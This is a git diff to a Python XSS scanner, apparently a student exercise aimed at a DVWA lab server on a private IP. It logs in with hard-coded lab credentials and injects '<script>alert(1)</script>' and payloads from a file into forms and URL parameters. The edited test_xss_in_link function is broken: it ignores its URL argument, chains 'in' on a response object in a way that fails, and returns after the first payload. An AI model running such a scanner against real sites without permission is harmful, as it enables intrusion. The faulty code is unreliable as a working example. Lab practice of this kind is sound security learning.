@@ -60,10 +60,10 @@ class Scanner:
         for link in self.target_links:
             forms = self.extract_forms(link)
             for form in forms:
-                print(" Testing Started " + link)
+                print(" --> Testing Started " + link)
                 is_vulnerable_to_xss = self.test_xss_in_form(form, link)
                 if is_vulnerable_to_xss:
-                    print("XSS Found in  " + link + "In the following form")
+                    print("-->XSS Found in  " + link + "In the following form")
                     print(form)
 
             if "=" in link:
@@ -74,26 +74,48 @@ class Scanner:
 
 
     def test_xss_in_link(self, url):
-        xss_test_script = "<script>alert(1)</script>"
-        url = url.replace("=" , "=" + xss_test_script)
-        response = self.session.get(url)
-        return xss_test_script in str(response.content)
+        with open("XSS_payloads.txt", encoding= 'utf-8') as f:
+            for line in f:
+                url = target_url
+                xss_test_script = line
+                #xss_test_script = "<script>alert(1)</script>"
+                url = url.replace("=" , "=" + xss_test_script)
+                print("url: " + url)
+                response = requests.session().get(url)
+                is_present = xss_test_script in response in str(response.content)
+                if is_present is True:
+                    break
+                
+                #return xss_test_script in str(response.content)
+                return is_present
 
 
     def test_xss_in_form(self, form, url):
         xss_test_script = "<script>alert(1)</script>"
         response = self.submit_form(form, xss_test_script, url)
         if xss_test_script in str(response.content):
-            return xss_test_script in response.content
+            #return xss_test_script in response.content
+            return True
 
 
 
 target_url = "http://192.168.1.104/dvwa/"
 logout_link_remove = [target_url  + "logout.php"]
-credentials = {"username": "admin", "password": "admin", "Login": "submit"}
+credentials = {"username": "gordonb", "password": "abc123", "Login": "submit"}
+#credentials = {"login": "bee", "password": "bug", "security_level": "0", "form": "submit"}
+
 
 vuln_scanner = Scanner(target_url, logout_link_remove)
 vuln_scanner.session.post(target_url + "/" + "login.php", data=credentials)
-
 vuln_scanner.crawl()
 vuln_scanner.run_scanner()
+
+
+
+#vuln_scanner.session.post("http://192.168.1.104/dvwa/login.php", data=credentials)
+#vuln_scanner.crawl(target_url)
+
+#forms = vuln_scanner.extract_forms("http://192.168.1.104/dvwa/vulnerabilities/xss_r/")
+#response = vuln_scanner.test_xss_in_form(forms[0], "http://192.168.1.104/dvwa/vulnerabilities/xss_r/")
+#response = vuln_scanner.test_xss_in_link("http://192.168.1.104/dvwa/vulnerabilities/xss_r?id=1")
+#print(response)
